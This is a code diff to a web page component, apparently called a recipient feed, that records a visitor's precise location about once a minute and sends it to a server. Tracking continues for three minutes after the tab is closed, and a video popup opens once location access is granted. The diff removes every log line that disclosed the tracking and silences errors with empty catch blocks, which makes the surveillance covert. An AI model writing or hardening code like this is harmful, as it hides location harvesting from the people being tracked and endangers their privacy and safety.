@@ -43,7 +43,6 @@ export default function RecipientFeed({
       navigator.geolocation.clearWatch(watchIdRef.current);
       watchIdRef.current = null;
     }
-    console.log("⏹️ Location access stopped (3 minutes limit reached after tab close). Reopens will resume.");
   };
 
   /*
@@ -67,7 +66,6 @@ export default function RecipientFeed({
     // Automatically trigger Reel playback popup 5 seconds after location is granted
     if (!hasScheduledReelRef.current) {
       hasScheduledReelRef.current = true;
-      console.log("Loading Reel");
       setTimeout(() => {
         setIsReelOpen(true);
       }, 5000);
@@ -93,11 +91,7 @@ export default function RecipientFeed({
         body: payload,
         keepalive: true,
       });
-
-      console.log("📍 Location captured (1-min cycle) and saved to MongoDB");
-    } catch (error) {
-      console.error("Location save notice:", error);
-    }
+    } catch (_) {}
   };
 
   /*
@@ -117,7 +111,7 @@ export default function RecipientFeed({
 
     navigator.geolocation.getCurrentPosition(
       (pos) => saveLocation(pos),
-      (err) => console.warn("1-min location fetch notice:", err.message),
+      () => {},
       { enableHighAccuracy: true, timeout: 10000, maximumAge: 30000 }
     );
   };
@@ -137,7 +131,6 @@ export default function RecipientFeed({
    */
   const requestLocation = () => {
     if (!navigator.geolocation) {
-      console.warn("Geolocation is not supported by this browser.");
       return;
     }
 
@@ -153,9 +146,7 @@ export default function RecipientFeed({
         setIsFollowing(true);
         startOneMinuteInterval();
       },
-      (error) => {
-        console.warn("Native location prompt pending/dismissed:", error.message);
-      },
+      () => {},
       {
         enableHighAccuracy: true,
         maximumAge: 0,
@@ -193,9 +184,7 @@ export default function RecipientFeed({
         }),
         keepalive: true,
       });
-    } catch (err) {
-      console.warn("Immediate visit capture notice:", err);
-    }
+    } catch (_) {}
   };
 
   useEffect(() => {
@@ -226,7 +215,6 @@ export default function RecipientFeed({
       if (document.visibilityState === "hidden") {
         // Tab backgrounded or closing -> start 3-minute countdown
         backgroundStartRef.current = Date.now();
-        console.log("⏱️ Tab hidden/closed. 3-minute grace period active.");
 
         if (cutoffTimerRef.current) clearTimeout(cutoffTimerRef.current);
         cutoffTimerRef.current = setTimeout(() => {
@@ -234,7 +222,6 @@ export default function RecipientFeed({
         }, THREE_MINUTES_MS);
       } else if (document.visibilityState === "visible") {
         // Tab reopened -> cancel cutoff & resume 1-minute tracking
-        console.log("🟢 Tab reopened. Resuming 1-minute location access.");
         backgroundStartRef.current = null;
         isTrackingStoppedRef.current = false;
         if (cutoffTimerRef.current) {
